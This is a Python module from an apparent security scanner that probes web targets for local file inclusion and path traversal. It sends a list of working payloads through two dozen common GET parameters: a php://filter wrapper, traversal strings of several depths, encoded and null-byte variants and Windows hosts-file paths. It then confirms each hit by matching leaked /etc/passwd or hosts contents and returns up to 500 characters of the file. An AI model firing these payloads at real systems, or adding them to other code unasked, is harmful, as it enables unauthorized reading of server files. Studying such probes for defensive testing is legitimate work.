"""
SB - Professional Security Scanner
LFI (Local File Inclusion) and Path Traversal active probe module.
Tests common URL GET parameters for file inclusion vulnerabilities.
Authorized use only.
"""
import base64
import re

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Parameters ordered by real-world hit rate
_LFI_PARAMS = [
    'page', 'file', 'include', 'path', 'template', 'view',
    'doc', 'document', 'pg', 'style', 'theme', 'lang',
    'action', 'content', 'load', 'read', 'display', 'layout',
    'module', 'conf', 'dir', 'folder', 'root', 'src',
]

# Payloads ordered: PHP wrapper first (most distinctive hit), then traversal
_LFI_PAYLOADS = [
    # PHP filter wrapper — triggers base64-encoded file output
    ('php_filter',  'php://filter/convert.base64-encode/resource=/etc/passwd'),
    # Direct traversal depths
    ('trav_8',      '../../../../../../../../etc/passwd'),
    ('trav_6',      '../../../../../../etc/passwd'),
    ('trav_4',      '../../../../etc/passwd'),
    # URL-encoded dot-slash
    ('url_enc',     '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'),
    # Double-URL-encoded (bypasses first-pass decode)
    ('dbl_enc',     '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'),
    # Null-byte truncation (PHP < 5.3)
    ('null_byte',   '../../../../../../../../etc/passwd%00.php'),
    # Windows targets
    ('win_hosts',   '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'),
    ('win_enc',     '%2e%2e%5c' * 6 + 'windows%5csystem32%5cdrivers%5cetc%5chosts'),
]

_LINUX_INDICATORS = ['root:x:0:0', 'root:!:0:0', '/bin/bash', '/bin/sh', 'nobody:x:']
_WIN_INDICATORS   = ['# Copyright (c) 1993-', '127.0.0.1       localhost',
                     '# This is a sample HOSTS file']
_B64_BLOCK        = re.compile(r'^[A-Za-z0-9+/]{60,}={0,2}$', re.MULTILINE)


def _confirm(body: str, payload_name: str) -> tuple[bool, str, str]:
    """Return (confirmed, preview_text, os_guess)."""
    if payload_name == 'php_filter':
        for line in body.splitlines():
            line = line.strip()
            if len(line) >= 60 and re.match(r'^[A-Za-z0-9+/]+=*$', line):
                try:
                    decoded = base64.b64decode(line + '==').decode('utf-8', 'replace')
                    if any(ind in decoded for ind in _LINUX_INDICATORS):
                        return True, decoded[:500], 'Linux'
                except Exception:
                    pass

    if any(ind in body for ind in _LINUX_INDICATORS):
        return True, body[:500], 'Linux'
    if 'win' in payload_name and any(ind in body for ind in _WIN_INDICATORS):
        return True, body[:500], 'Windows'
    return False, '', ''


def probe_lfi(base_url: str, session, timeout: int, log_cb=None) -> list[dict]:
    """
    Probe target for LFI and path traversal via GET parameters.
    Stops at first confirmed hit per param; caps at 3 unique vulnerable params.
    """
    findings    = []
    done_params = set()

    for param in _LFI_PARAMS:
        if len(findings) >= 3:
            break
        if param in done_params:
            continue
        for pname, payload in _LFI_PAYLOADS:
            try:
                url = f"{base_url}/?{param}={payload}"
                r   = session.get(url, timeout=timeout, verify=False,
                                  allow_redirects=True)
                if r.status_code != 200 or len(r.text) < 20:
                    continue
                confirmed, preview, os_guess = _confirm(r.text, pname)
                if confirmed:
                    method = 'PHP filter wrapper' if pname == 'php_filter' else 'Path traversal'
                    if log_cb:
                        log_cb(f"  [LFI] {base_url} — ?{param}= vulnerable ({method})")
                    findings.append({
                        'type': 'lfi',
                        'url':  base_url,
                        'path': f'/?{param}=...',
                        'data': {
                            'note':      f'LFI confirmed — ?{param}= parameter vulnerable',
                            'method':    method,
                            'param':     param,
                            'payload':   pname,
                            'lfi_url':   url[:200],
                            'os':        os_guess,
                            'preview':   preview,
                            'validated': True,
                        },
                    })
                    done_params.add(param)
                    break
            except Exception:
                pass

    return findings
